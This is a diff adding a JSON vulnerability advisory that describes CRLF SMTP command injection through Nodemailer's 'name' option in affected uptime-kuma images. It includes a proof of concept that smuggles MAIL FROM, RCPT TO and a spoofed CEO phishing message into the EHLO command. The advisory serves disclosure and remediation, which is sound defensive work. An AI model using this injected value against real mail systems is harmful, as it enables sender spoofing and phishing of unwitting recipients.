@@ -1,0 +1,63 @@
+{
+  "schema_version": "1.8.0",
+  "id": "DHI-losd-v7gl-pch5-pw7j",
+  "modified": "2026-11-14T01:06:37Z",
+  "published": "2026-11-14T01:06:37Z",
+  "upstream": [
+    "GHSA-vvjj-xcjg-gr5g"
+  ],
+  "summary": "### Summary",
+  "details": "### Summary\n\nNodemailer versions up to and including 8.0.4 are vulnerable to SMTP command injection via CRLF sequences in the transport `name` configuration option. The `name` value is used directly in the EHLO/HELO SMTP command without any sanitization for carriage return and line feed characters (`\\r\\n`). An attacker who can influence this option can inject arbitrary SMTP commands, enabling unauthorized email sending, email spoofing, and phishing attacks.\n\n### Details\n\nThe vulnerability exists in `lib/smtp-connection/index.js`. When establishing an SMTP connection, the `name` option is concatenated directly into the EHLO command:\n\n```javascript\n// lib/smtp-connection/index.js, line 71\nthis.name = this.options.name || this._getHostname();\n\n// line 1336\nthis._sendCommand('EHLO ' + this.name);\n```\n\nThe `_sendCommand` method writes the string directly to the socket followed by `\\r\\n` (line 1082):\n\n```javascript\nthis._socket.write(Buffer.from(str + '\\r\\n', 'utf-8'));\n```\n\nIf the `name` option contains `\\r\\n` sequences, each injected line is interpreted by the SMTP server as a separate command. Unlike the `envelope.from` and `envelope.to` fields which are validated for `\\r\\n` (line 1107-1119), and unlike `envelope.size` which was recently fixed (GHSA-c7w3-x93f-qmm8) by casting to a number, the `name` parameter receives no CRLF sanitization whatsoever.\n\nThis is distinct from the previously reported GHSA-c7w3-x93f-qmm8 (envelope.size injection) as it affects a different parameter (`name` vs `size`), uses a different injection point (EHLO command vs MAIL FROM command), and occurs at connection initialization rather than during message sending.\n\nThe `name` option is also used in HELO (line 1384) and LHLO (line 1333) commands with the same lack of sanitization.\n\n### PoC\n\n```javascript\nconst nodemailer = require('nodemailer');\nconst net = require('net');\n\n// Simple SMTP server to observe injected commands\nconst server = net.createServer(socket => {\n    socket.write('220 test ESMTP\\r\\n');\n    socket.on('data', data => {\n        const lines = data.toString().split('\\r\\n').filter(l => l);\n        lines.forEach(line => {\n            console.log('SMTP CMD:', line);\n            if (line.startsWith('EHLO') || line.startsWith('HELO'))\n                socket.write('250 OK\\r\\n');\n            else if (line.startsWith('MAIL FROM'))\n                socket.write('250 OK\\r\\n');\n            else if (line.startsWith('RCPT TO'))\n                socket.write('250 OK\\r\\n');\n            else if (line === 'DATA')\n                socket.write('354 Go\\r\\n');\n            else if (line === '.')\n                socket.write('250 OK\\r\\n');\n            else if (line === 'QUIT')\n                { socket.write('221 Bye\\r\\n'); socket.end(); }\n            else if (line === 'RSET')\n                socket.write('250 OK\\r\\n');\n        });\n    });\n});\n\nserver.listen(0, '127.0.0.1', () => {\n    const port = server.address().port;\n\n    // Inject a complete phishing email via EHLO name\n    const transport = nodemailer.createTransport({\n        host: '127.0.0.1',\n        port: port,\n        secure: false,\n        name: 'legit.host\\r\\nMAIL FROM:<attacker@evil.com>\\r\\n'\n            + 'RCPT TO:<victim@target.com>\\r\\nDATA\\r\\n'\n            + 'From: ceo@company.com\\r\\nTo: victim@target.com\\r\\n'\n            + 'Subject: Urgent\\r\\n\\r\\nPhishing content\\r\\n.\\r\\nRSET'\n    });\n\n    transport.sendMail({\n        from: 'legit@example.com',\n        to: 'legit-recipient@example.com',\n        subject: 'Normal email',\n        text: 'Normal content'\n    }, () => { server.close(); process.exit(0); });\n});\n```\n\nRunning this PoC shows the SMTP server receives the injected MAIL FROM, RCPT TO, DATA, and phishing email content as separate SMTP commands before the legitimate email is sent.\n\n### Impact\n\n**Who is affected:** Applications that allow users or external input to configure the `name` SMTP transport option. This includes:\n- Multi-tenant SaaS platforms with per-tenant SMTP configuration\n- Admin panels where SMTP hostname/name settings are stored in databases\n- Applications loading SMTP config from environment variables or external sources\n\n**What can an attacker do:**\n1. **Send unauthorized emails** to arbitrary recipients by injecting MAIL FROM and RCPT TO commands\n2. **Spoof email senders** by injecting arbitrary From headers in the DATA portion\n3. **Conduct phishing attacks** using the legitimate SMTP server as a relay\n4. **Bypass application-level controls** on email recipients, since the injected commands are processed before the application's intended MAIL FROM/RCPT TO\n5. **Perform SMTP reconnaissance** by injecting commands like VRFY or EXPN\n\nThe injection occurs at the EHLO stage (before authentication in most SMTP flows), making it particularly dangerous as the injected commands may be processed with the server's trust context.\n\n**Recommended fix:** Sanitize the `name` option by stripping or rejecting CRLF sequences, similar to how `envelope.from` and `envelope.to` are already validated on lines 1107-1119 of `lib/smtp-connection/index.js`. For example:\n\n```javascript\nthis.name = (this.options.name || this._getHostname()).replace(/[\\r\\n]/g, '');\n```",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:H/A:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Debian:13",
+        "name": "uptime-kuma-1",
+        "purl": "pkg:deb/dhi/uptime-kuma-1"
+      },
+      "versions": [
+        "1.23.17-0",
+        "1.23.17-1",
+        "1.23.17-2",
+        "1.23.17-3",
+        "1.23.17-4",
+        "1.23.17-5",
+        "1.23.17-6",
+        "1.23.17-7",
+        "1.23.17-8",
+        "1.23.17-9"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://scout.docker.com/v/DHI-losd-v7gl-pch5-pw7j"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/advisories/GHSA-vvjj-xcjg-gr5g"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/nodemailer/nodemailer/security/advisories/GHSA-vvjj-xcjg-gr5g"
+    },
+    {
+      "type": "FIX",
+      "url": "https://github.com/nodemailer/nodemailer/commit/0a43876801a420ca528f492eaa01bfc421cc306e"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/nodemailer/nodemailer/releases/tag/v8.0.5"
+    }
+  ]
+}
